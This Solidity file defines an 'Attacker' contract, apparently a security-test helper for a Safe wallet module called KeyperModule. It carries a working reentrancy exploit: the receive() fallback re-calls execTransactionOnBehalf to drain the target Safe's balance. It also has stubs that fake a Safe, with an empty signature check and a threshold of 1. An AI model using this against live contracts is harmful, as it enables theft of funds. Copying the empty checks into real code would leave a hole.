// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.15;

import {KeyperModule} from "../src/KeyperModule.sol";
import {Enum} from "@safe-contracts/common/Enum.sol";
import {Errors} from "../libraries/Errors.sol";
import {DataTypes} from "../libraries/DataTypes.sol";
import {Constants} from "../libraries/Constants.sol";

contract Attacker {
    bytes32 public orgFromAttacker;
    address public targetSafeFromAttacker;
    bytes public dataFromAttacker;
    bytes public signaturesFromAttacker;

    address[] public owners = new address[](2);

    KeyperModule public keyperModule;

    constructor(address _contractToAttackAddress) {
        keyperModule = KeyperModule(_contractToAttackAddress);
    }

    //this is called when Attackee sends Ether to this contract (Attacker)
    receive() external payable {
        if (address(targetSafeFromAttacker).balance > 0 gwei) {
            keyperModule.execTransactionOnBehalf(
                orgFromAttacker,
                targetSafeFromAttacker,
                address(this),
                address(targetSafeFromAttacker).balance,
                dataFromAttacker,
                Enum.Operation(0),
                signaturesFromAttacker
            );
        }
    }

    function performAttack(
        bytes32 org,
        address targetSafe,
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        bytes memory signatures
    ) external returns (bool result) {
        setParamsForAttack(org, targetSafe, data, signatures);
        result = keyperModule.execTransactionOnBehalf(
            org, targetSafe, to, value, data, operation, signatures
        );
        return true;
    }

    function setOwners(address[] memory _owners) public {
        for (uint256 i = 0; i < owners.length; i++) {
            owners[i] = _owners[i];
        }
    }

    function getBalanceFromSafe(address _safe)
        external
        view
        returns (uint256)
    {
        return address(_safe).balance;
    }

    function getBalanceFromAttacker() external view returns (uint256) {
        return address(this).balance;
    }

    function checkSignatures(
        bytes32 dataHash,
        bytes memory data,
        bytes memory signatures
    ) external view {}

    function getOwners() public view returns (address[] memory) {
        return owners;
    }

    function getThreshold() public pure returns (uint256) {
        return uint256(1);
    }

    function setParamsForAttack(
        bytes32 _org,
        address _targetSafe,
        bytes calldata _data,
        bytes memory _signatures
    ) internal {
        orgFromAttacker = _org;
        targetSafeFromAttacker = _targetSafe;
        dataFromAttacker = _data;
        signaturesFromAttacker = _signatures;
    }
}
